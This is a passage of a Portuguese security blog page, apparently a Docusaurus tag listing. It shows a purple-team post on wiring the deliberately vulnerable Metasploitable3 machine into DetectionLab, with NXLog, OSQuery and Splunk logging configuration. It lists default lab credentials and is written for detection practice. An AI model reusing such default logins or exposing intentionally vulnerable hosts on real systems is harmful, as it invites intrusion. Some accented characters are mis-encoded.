<!doctype html>
<html lang="pt" dir="ltr" class="blog-wrapper blog-tags-post-list-page plugin-blog plugin-id-default">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">3 postagens marcadas com &quot;pr√°tica&quot; | Security Stuff</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://imgodes.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://imgodes.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://imgodes.github.io/blog/tags/pratica"><meta data-rh="true" name="docusaurus_locale" content="pt"><meta data-rh="true" name="docsearch:language" content="pt"><meta data-rh="true" property="og:title" content="3 postagens marcadas com &quot;pr√°tica&quot; | Security Stuff"><meta data-rh="true" name="docusaurus_tag" content="blog_tags_posts"><meta data-rh="true" name="docsearch:docusaurus_tag" content="blog_tags_posts"><link data-rh="true" rel="icon" href="/img/favicon.png"><link data-rh="true" rel="canonical" href="https://imgodes.github.io/blog/tags/pratica"><link data-rh="true" rel="alternate" href="https://imgodes.github.io/en/blog/tags/pratica" hreflang="en-US"><link data-rh="true" rel="alternate" href="https://imgodes.github.io/blog/tags/pratica" hreflang="pt"><link data-rh="true" rel="alternate" href="https://imgodes.github.io/blog/tags/pratica" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Security Stuff RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Security Stuff Atom Feed"><link rel="stylesheet" href="/assets/css/styles.5ae29c70.css">
<link rel="preload" href="/assets/js/runtime~main.3ab79198.js" as="script">
<link rel="preload" href="/assets/js/main.b56f07bf.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region" aria-label="Pular para o conte√∫do principal"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Pular para o conte√∫do principal</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/kanagawa.png" alt="My Site Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/kanagawa.png" alt="My Site Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">Godes</b></a><a class="navbar__item navbar__link" href="/docs/intro">Hunt</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/blog">Blog</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true" class="iconLanguage_nlXk"><path fill="currentColor" d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"></path></svg>Portugu√™s</a><ul class="dropdown__menu"><li><a href="/en/blog/tags/pratica" target="_self" rel="noopener noreferrer" class="dropdown__link" lang="en-US">English</a></li><li><a href="/blog/tags/pratica" target="_self" rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang="pt">Portugu√™s</a></li></ul></div></div><div class="navbar__items navbar__items--right"><a href="https://github.com/imgodes" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><a href="https://www.linkedin.com/in/gguedescruz/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">LinkedIn<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_pO2u margin-bottom--md">Recent posts</div><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2023/04/27/metasploitable-detec/metasploitable3-detectionlab">Purple Team - Metasploitable3 &amp; DetectionLab</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2023/04/23/malboxes/malboxes-vms">Criando VMs Malboxes</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2023/02/22/intro-jekyll/introducao-jekyll">Seu site pessoal gratis</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2022/12/03/linksimb/malabarismo-com-links-simb√≥licos">Malabarismo com link simb√≥lico</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/2022/10/22/links-ih">Links √∫teis para o dia a dia</a></li></ul></nav></aside><main class="col col--7" itemscope="" itemtype="http://schema.org/Blog"><header class="margin-bottom--xl"><h1>3 postagens marcadas com &quot;pr√°tica&quot;</h1><a href="/blog/tags">Ver todas os Marcadores</a></header><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><meta itemprop="image" content="https://imgodes.github.io/assets/images/heros-83b2c6108d57e26cda9496a77795aecd.jpg"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/blog/2023/04/27/metasploitable-detec/metasploitable3-detectionlab">Purple Team - Metasploitable3 &amp; DetectionLab</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2023-04-26T18:52:00.000Z" itemprop="datePublished">26 de abril de 2023</time> ¬∑ <!-- -->Leitura de 12 minutos</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://www.linkedin.com/in/gguedescruz/" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="https://avatars.githubusercontent.com/u/52048434?v=4" alt="Godes"></a><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://www.linkedin.com/in/gguedescruz/" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Godes</span></a></div><small class="avatar__subtitle" itemprop="description">Defesa Cibern√©tica</small></div></div></div></div></header><div class="markdown" itemprop="articleBody"><p>Criado para adi√ß√£o do <a href="https://github.com/rapid7/metasploitable3" target="_blank" rel="noopener noreferrer">Metasploitable3</a> (com seus logs e telemetrias) ao <a href="https://detectionlab.network/" target="_blank" rel="noopener noreferrer">DetectionLab</a>.</p><blockquote><p>Observa√ß√£o: esse guia pode ser um pouco dif√≠cil de acompanhar caso n√£o conhe√ßa o Detection Lab, mas basta instala-lo uma vez que tudo ficar√° mais f√°cil de entender.</p></blockquote><h1>√çndice</h1><h1>Introdu√ß√£o</h1><p>O Metasploitable3 √© uma m√°quina com servi√ßos propositalmente vulner√°veis. Existem v√°rias vers√µes dele, eu escolhi a terceira por ser a <a href="https://github.com/rapid7/metasploitable3/wiki#differences-between-metasploitable-3-and-the-older-versions" target="_blank" rel="noopener noreferrer">mais nova</a>.</p><p>J√° o <a href="https://twitter.com/DetectionLab" target="_blank" rel="noopener noreferrer">DetectionLab</a> √© um agrupado de ferramentas de detec√ß√£o e logging, que juntas se tornam um √≥timo ambiente de testes.</p><ul><li><a href="https://twitter.com/DetectionLab" target="_blank" rel="noopener noreferrer">Twitter do DetectionLab</a></li><li><a href="https://github.com/clong" target="_blank" rel="noopener noreferrer">Github do Criador</a></li><li><a href="https://detectionlab.network" target="_blank" rel="noopener noreferrer">Site oficial</a></li></ul><p><img loading="lazy" alt="dttnlab" src="/assets/images/overview-d53e1b77b882058fcbb23e03c0bc245c.png" width="3148" height="2434" class="img_ev3q">
<em>Imagem retirada do site oficial - <a href="https://detectionlab.network" target="_blank" rel="noopener noreferrer">https://detectionlab.network</a></em></p><p><strong>Pontos importantes</strong>:</p><ul><li>O tr√°fego de rede √© loggado pelo Zeek;</li><li>Suricata √© um IDS, um IPS, um NSM e processador de captura de pacotes open source, ele trabalha junto com o Zeek na an√°lise de tr√°fego;</li><li>O Velociraptor e o OSQuery nos apoiam quanto a an√°lise do endpoint e ambos possuem sua pr√≥pria interface web;</li><li>O OSQuery consegue fazer consultas de baixo n√≠vel do SO. <ul><li>Ele exp√µe as informa√ß√µes do SO √° um banco de dados que pode ser consultado por uma interface web chamada Fleet;</li><li>Apesar ter sua pr√≥pria interface web, o OsQuery envia logs dos resultados das consultas (<code>index=osquery</code>) e tamb√©m de status dele mesmo (INFO/WARN/ERROR). </li></ul></li><li>Todos esses logs podem ser consultados no Splunk.</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="combo---metasploitable3--detectionlab">Combo - Metasploitable3 &amp; DetectionLab<a href="#combo---metasploitable3--detectionlab" class="hash-link" aria-label="Link direto para Combo - Metasploitable3 &amp; DetectionLab" title="Link direto para Combo - Metasploitable3 &amp; DetectionLab">‚Äã</a></h2><p>Combinando a capacidade de detec√ß√£o e investiga√ß√£o do Splunk + OSQuery, com os futuros ataques feitos ao servidor vulner√°vel, ganhamos a capacidade de identificar as etapas do ataque. Mas antes de seguir com a pr√°tica, temos que entender como os componentes interagem, que ap√≥s as minhas customiza√ß√µes, passa a funcionar da seguinte forma:
<img loading="lazy" alt="combopng" src="/assets/images/detectionlabmeta3x-bb7bdd513167c3552d02c2090ba7f90d.png" width="2052" height="1641" class="img_ev3q">
<em>Desenho da arquitetura do lab do ponto de vista das funcionalidades</em> </p><p>Observa√ß√µes:</p><ul><li>Configurei o envio dos logs do apache para o Splunk via NXLog (mais detalhes em <a href="#nxlog">NXLog</a>);</li><li>Configurei a coleta de telemetrias pelo OSQuery (mais detalhes em <a href="#osquery-e-fleet">OSQuery e Fleet</a>);</li><li>Instalei uma VM do Kali para efetuar os ataques;</li><li>Desliguei as m√°quinas windows do DetectionLab pois n√£o iam ser usadas;</li><li><em>O agente do Velociraptor ainda n√£o est√° configurado no Metasploitable, portanto seguimos apenas com o OSQuery.</em></li></ul><h1>Setup TLTR - Too lazy to read</h1><p>Se voc√™ estiver com pressa, ou j√° saiba como tudo isso funciona, basta seguir o passos abaixo.</p><blockquote><p>Caso desconhe√ßa as ferramentas acima, recomendo ler um pouco antes de tentar instalar e configurar.
{: .prompt-info}</p></blockquote><h2 class="anchor anchorWithStickyNavbar_LWe7" id="instala√ß√£o">Instala√ß√£o<a href="#instala√ß√£o" class="hash-link" aria-label="Link direto para Instala√ß√£o" title="Link direto para Instala√ß√£o">‚Äã</a></h2><p><strong>Com o detectionlab j√° INSTALADO e funcionando use os comandos abaixo:</strong></p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">git</span><span class="token plain"> clone https://github.com/imgodes/DetectionLabMetasploitable3.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> DetectionLabMetasploitable3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vagrant up</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Crie um index no Splunk chamado <code>syslog</code>.
Explica√ß√£o detalhada em <a href="#index">index</a>.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="acessos">Acessos<a href="#acessos" class="hash-link" aria-label="Link direto para Acessos" title="Link direto para Acessos">‚Äã</a></h2><ul><li>Fleet login: <a href="https://192.168.56.105:8412" target="_blank" rel="noopener noreferrer">https://192.168.56.105:8412</a> - <a href="mailto:admin@detectionlab.network" target="_blank" rel="noopener noreferrer">admin@detectionlab.network</a>:Fl33tpassword!</li><li>Splunk login: <a href="https://192.168.56.105:8000" target="_blank" rel="noopener noreferrer">https://192.168.56.105:8000</a> - admin:changeme</li><li>Velociraptor login: <a href="https://192.168.56.105:9999" target="_blank" rel="noopener noreferrer">https://192.168.56.105:9999</a> - admin:changeme</li><li>Metasploitable3 em <a href="http://192.168.56.210" target="_blank" rel="noopener noreferrer">http://192.168.56.210</a> - vagrant:vagrant</li></ul><blockquote><p>Agora vamos a apresenta√ß√£o das customiza√ß√µes feitas. Lembrando que √© tudo meramente informativo, afinal, ser√° configurado automaticamente ap√≥s executar <code>vagrant up</code>(exceto a configura√ß√£o do index do Splunk).
{: .prompt-danger}</p></blockquote><h1>Logging</h1><p>O Metasploitable √© somente uma m√°quina vulner√°vel alvo do nosso ataque, ent√£o sozinha, seria dif√≠cil de investigar e identificar a atividade maliciosa. Por essa raz√£o, instalei o OSQuery e o NXLog no Metasploitable. Essas ferramentas v√£o nos das a capacidade: </p><ul><li><strong>OSQuery</strong> üëâ Consultar processos, pastas, arquivos, comandos usados, modifica√ß√µes, sockets de rede e muitas outras informa√ß√µes sobre o sistema operacional em tempo real, por meio de comandos SQL;<ul><li>Pode ser consultado pela interface web do Fleet, ou pelo pr√≥prio OSQuery mesmo (dentro da m√°quina do Metasploitable);</li></ul></li><li><strong>NXLog</strong> üëâ Envio de logs de m√°quina ao Splunk;</li><li><strong>Splunk</strong> üëâ Consulta de logs de maneira centralizada.</li></ul><p><img loading="lazy" alt="detectionlab_simples-logging.drawio.png" src="/assets/images/detectionlab_simples-logging.drawio-f649221797f0a99f1c1b1ec0c087eb43.png" width="614" height="382" class="img_ev3q">
<em>Desenho da arquitetura do lab do ponto de vista do logging</em> </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="osquery-e-fleet">OSQuery e Fleet<a href="#osquery-e-fleet" class="hash-link" aria-label="Link direto para OSQuery e Fleet" title="Link direto para OSQuery e Fleet">‚Äã</a></h2><p>O OSQuery √© uma ferramenta que permite consultar informa√ß√µes do SO. </p><p>J√° o Fleet √© um gerenciador de OSQuery open source, com ele podemos gerenciar e consultar o OSQuery em v√°rios dispositivos por meio de uma interface web.</p><p>Processos, opera√ß√µes de rede, e muitas outras coisas podem ser consultas. Para a alegria do brasileiro m√©dio, existem  muitos &quot;packs de consultas&quot; prontos voltados para identifica√ß√£o de ataques. Esses packs, s√£o queries prontas, basta executa-las. </p><blockquote><p>Exemplos - <a href="https://github.com/osquery/osquery/tree/master/packs" target="_blank" rel="noopener noreferrer">OSQuery packs oficiais</a>, <a href="https://github.com/palantir/osquery-configuration/tree/master" target="_blank" rel="noopener noreferrer">Palantir Packs</a></p></blockquote><ul><li>Os &quot;agentes&quot; do OSQuery s√£o registrados no Fleet.<ul><li>As consultas e configura√ß√µes do agente Osquery s√£o fornecidas pelo Fleet atrav√©s de uma conex√£o TLS.  </li></ul></li><li>A configura√ß√£o do agente √© definida pelo arquivo <code>osquery.flags</code>{: .filepath} </li><li>O nosso Fleet do DetectionLab √© pr√©-configurado com os arquivos do <a href="https://github.com/palantir/osquery-configuration" target="_blank" rel="noopener noreferrer">Palantir</a>. </li><li>As op√ß√µes ativadas no arquivo de <code>osquery.flags</code>{: .filepath} s√£o as do pr√≥prio Palantir, e n√£o alterei nada, apenas peguei do reposit√≥rio deles. </li><li>De acordo com o reposit√≥rio do Palantir, √© esperado que hosts Linux tenham o arquivo <a href="https://github.com/palantir/osquery-configuration/blob/master/Classic/Servers/Linux/packs/ossec-rootkit.conf" target="_blank" rel="noopener noreferrer">ossec-rootkit.conf</a> em <code>/etc/osquery/packs/ossec-rootkit.conf</code>{: .filepath} isso √© garantido pelo vagrant quando executamos <code>vagrant up</code>.</li><li>A op√ß√£o user_events √© desabilitada por padr√£o, pois de acordo com a documenta√ß√£o √© redundante.<blockquote><p>&quot;On Linux, a companion table called user_events is included that provides several authentication-based events. If you are enabling process auditing it should be trivial to also include this table&quot; - <a href="https://osquery.readthedocs.io/en/stable/deployment/process-auditing/" target="_blank" rel="noopener noreferrer">User event auditing with Audit</a></p></blockquote></li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="nxlog">NXLog<a href="#nxlog" class="hash-link" aria-label="Link direto para NXLog" title="Link direto para NXLog">‚Äã</a></h2><p>O NXLog √© minha ferramenta favorita para encaminhamento de logs. NXLog pode processar eventos de milhares de fontes diferentes, funciona em sistemas antigos e novos. √â capaz de processar um volume absurdo de logs (de acordo com a <a href="https://docs.nxlog.co/userguide/intro/about-nxlog.html" target="_blank" rel="noopener noreferrer">documenta√ß√£o</a>). Trabalha bem com diversos protocolos de rede, transporte, e criptografias, al√©m de suportar  tamb√©m de formatos de logs dos mais variados (Syslog, Windows Event Log, JSON, etc). E mesmo que n√£o tenha alguma predefini√ß√£o, ainda √© poss√≠vel fazer o parsing manualmente.</p><p>Ent√£o iremos instalar o NXLog no Metasploitable3, para o parsing inicial, e envio dos logs do apache para o Splunk. A configura√ß√£o do NXLog √© toda centralizada no arquivo <code>nxlog.conf</code>{: .filepath}. </p><ul><li>A minha configura√ß√£o est√° dispon√≠vel no <a href="https://raw.githubusercontent.com/imgodes/DetectionLabMetasploitable3/master/nxlog.conf" target="_blank" rel="noopener noreferrer">github</a>;</li><li>O agente do NXlog usado √© o 2.10 para Ubuntu 14.04 (trusty);</li></ul><p>O agente do NXLog consegue ler alguma entrada (<a href="#nxlog-input">Input</a>), manipula-la (Exec) e enviar para alguma sa√≠da(<a href="#nxlog-output">Output e Route</a>). Essas diretrizes s√£o definidas todas no mesmo arquivo <code>nxlog.conf</code>{: .filepath}.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="nxlog-input">NXLog Input<a href="#nxlog-input" class="hash-link" aria-label="Link direto para NXLog Input" title="Link direto para NXLog Input">‚Äã</a></h3><p>√â a entrada dos logs, nesse caso um arquivo.</p><ul><li>Configurei o NXLog para ler os logs do apache em <code>/var/log/apache2/access.log</code>{: .filepath};</li><li>Fiz uma regex para fazer o parsing dos campos do apache;<ul><li>Essas configura√ß√µes est√£o de acordo com as configura√ß√µes de logging que declarei no arquivo <code>apache2.conf</code>, caso altere, lembre de alterar manter a concord√¢ncia entre eles.</li></ul></li></ul><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Input</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">apache_access</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Module im_file</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    File        &quot;/var/log/apache2/access.log&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Exec</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if $raw_event =~ /(?x)^(\S+)\ \S+\ (\S+)\ \[([^\]]+)\]\ \&quot;(\S+)\ (.+)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                          \ HTTP\/\d\.\d\&quot;\ (\S+)\ (\S+)\ \&quot;([^\&quot;]+)\&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                          \ \&quot;([^\&quot;]+)\&quot;/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $Hostname = $1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if $2 != &#x27;-&#x27; $AccountName = $2;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $EventTime = parsedate($3);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $HTTPMethod = $4;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $HTTPURL = $5;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $HTTPResponseStatus = $6;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if $7 != &#x27;-&#x27; $FileSize = $7;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if $8 != &#x27;-&#x27; $HTTPReferer = $8;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if $9 != &#x27;-&#x27; $HTTPUserAgent = $9;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Exec</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Input</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&#x27;/etc/nxlog/nxlog.conf&#x27;}</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="nxlog-output">NXLog Output<a href="#nxlog-output" class="hash-link" aria-label="Link direto para NXLog Output" title="Link direto para NXLog Output">‚Äã</a></h3><p>Aqui configuramos o que vem do Input e vai para o Splunk.</p><ul><li>Digo que sa√≠da usar√° a porta <code>514/UDP</code> sendo que o destino ser√° o IP do servidor Splunk;</li><li>Executo a fun√ß√£o <code>drop()</code> para descartar logs cujo o hostname vem como ipv4 de loopback (isso estava floodando o Splunk de eventos);</li><li>Executo a fun√ß√£o <code>to_json()</code> para converter o log para o formato JSON.</li></ul><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Output</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">syslog_udp</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Module     om_udp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Host       192.168.56.105</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PORT       514 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Exec</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if ($Hostname == &#x27;127.0.0.1&#x27;) drop();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        to_json();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Exec</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Output</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Route</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">1</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Path apache_access =&gt; syslog_udp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Route</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" 